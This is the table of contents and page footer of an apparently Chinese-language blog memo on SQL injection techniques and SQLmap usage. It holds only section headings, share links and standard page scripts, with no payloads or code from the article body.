      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#MySQL"><span class="toc-number">1.1.</span> <span class="toc-text">MySQL</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#函数"><span class="toc-number">1.1.1.</span> <span class="toc-text">函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#语法"><span class="toc-number">1.1.2.</span> <span class="toc-text">语法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#符号"><span class="toc-number">1.1.3.</span> <span class="toc-text">符号</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#默认库"><span class="toc-number">1.1.4.</span> <span class="toc-text">默认库</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL-Server"><span class="toc-number">1.2.</span> <span class="toc-text">SQL Server</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#注入"><span class="toc-number">2.</span> <span class="toc-text">注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#识别"><span class="toc-number">2.1.</span> <span class="toc-text">识别</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#盲注"><span class="toc-number">2.2.</span> <span class="toc-text">盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#布尔盲注"><span class="toc-number">2.2.1.</span> <span class="toc-text">布尔盲注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#时间盲注"><span class="toc-number">2.2.2.</span> <span class="toc-text">时间盲注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DNSLog"><span class="toc-number">2.2.3.</span> <span class="toc-text">DNSLog</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#异或注入"><span class="toc-number">2.2.4.</span> <span class="toc-text">异或注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#查询注入"><span class="toc-number">2.3.</span> <span class="toc-text">查询注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#联合查询"><span class="toc-number">2.3.1.</span> <span class="toc-text">联合查询</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#堆叠查询"><span class="toc-number">2.3.2.</span> <span class="toc-text">堆叠查询</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#报错注入"><span class="toc-number">2.4.</span> <span class="toc-text">报错注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#约束攻击"><span class="toc-number">2.5.</span> <span class="toc-text">约束攻击</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参数污染"><span class="toc-number">2.6.</span> <span class="toc-text">参数污染</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#二次注入"><span class="toc-number">2.7.</span> <span class="toc-text">二次注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#宽字节注入"><span class="toc-number">2.8.</span> <span class="toc-text">宽字节注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HTTP头-注入"><span class="toc-number">2.9.</span> <span class="toc-text">HTTP头 注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#XFF-注入"><span class="toc-number">2.9.1.</span> <span class="toc-text">XFF 注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Cookie-注入"><span class="toc-number">2.9.2.</span> <span class="toc-text">Cookie 注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Base64-注入"><span class="toc-number">2.10.</span> <span class="toc-text">Base64 注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HTTP头-注入-1"><span class="toc-number">2.11.</span> <span class="toc-text">HTTP头 注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#XFF-注入-1"><span class="toc-number">2.11.1.</span> <span class="toc-text">XFF 注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Cookie-注入-1"><span class="toc-number">2.11.2.</span> <span class="toc-text">Cookie 注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#绕过关键词过滤注入"><span class="toc-number">2.12.</span> <span class="toc-text">绕过关键词过滤注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#关键字符绕过"><span class="toc-number">2.12.1.</span> <span class="toc-text">关键字符绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#通用编码绕过"><span class="toc-number">2.12.2.</span> <span class="toc-text">通用编码绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#等价函数绕过"><span class="toc-number">2.12.3.</span> <span class="toc-text">等价函数绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#模糊测试字典"><span class="toc-number">2.12.4.</span> <span class="toc-text">模糊测试字典</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CTF题目实战"><span class="toc-number">2.12.5.</span> <span class="toc-text">CTF题目实战</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SQLmap"><span class="toc-number">3.</span> <span class="toc-text">SQLmap</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Paramerter"><span class="toc-number">3.1.</span> <span class="toc-text">Paramerter</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GET"><span class="toc-number">3.2.</span> <span class="toc-text">GET</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#POST"><span class="toc-number">3.3.</span> <span class="toc-text">POST</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Header"><span class="toc-number">3.4.</span> <span class="toc-text">Header</span></a></li></ol></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://shavchen.github.io/SQL%E6%B3%A8%E5%85%A5%E5%A4%87%E5%BF%98/" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=https://shavchen.github.io/SQL%E6%B3%A8%E5%85%A5%E5%A4%87%E5%BF%98/&text=SQL注入备忘" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://shavchen.github.io/SQL%E6%B3%A8%E5%85%A5%E5%A4%87%E5%BF%98/&title=SQL注入备忘" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://shavchen.github.io/SQL%E6%B3%A8%E5%85%A5%E5%A4%87%E5%BF%98/&is_video=false&description=SQL注入备忘" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=SQL注入备忘&body=Check out this article: https://shavchen.github.io/SQL%E6%B3%A8%E5%85%A5%E5%A4%87%E5%BF%98/" target="_blank" rel="noopener"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=https://shavchen.github.io/SQL%E6%B3%A8%E5%85%A5%E5%A4%87%E5%BF%98/&title=SQL注入备忘" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=https://shavchen.github.io/SQL%E6%B3%A8%E5%85%A5%E5%A4%87%E5%BF%98/&title=SQL注入备忘" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://shavchen.github.io/SQL%E6%B3%A8%E5%85%A5%E5%A4%87%E5%BF%98/&title=SQL注入备忘" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=https://shavchen.github.io/SQL%E6%B3%A8%E5%85%A5%E5%A4%87%E5%BF%98/&title=SQL注入备忘" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://shavchen.github.io/SQL%E6%B3%A8%E5%85%A5%E5%A4%87%E5%BF%98/&name=SQL注入备忘&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy; 2020 shavchen
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Article</a></li>
         
          <li><a href="/categories/">Categories</a></li>
        
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->
<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">

    <!-- jquery -->
<script src="/lib/jquery/jquery.min.js"></script>
<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
<!-- clipboard -->

  <script src="/lib/clipboard/clipboard.min.js"></script>
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="far fa-clone"></i>';
    btn += '</span>'; 
    // mount it!
    $(".highlight .code pre").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      target: function(trigger) {
        return trigger.nextElementSibling;
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>

<script src="/js/main.js"></script>
<!-- search -->

<!-- Google Analytics -->

<!-- Baidu Analytics -->

<!-- Disqus Comments -->


</body>
</html>
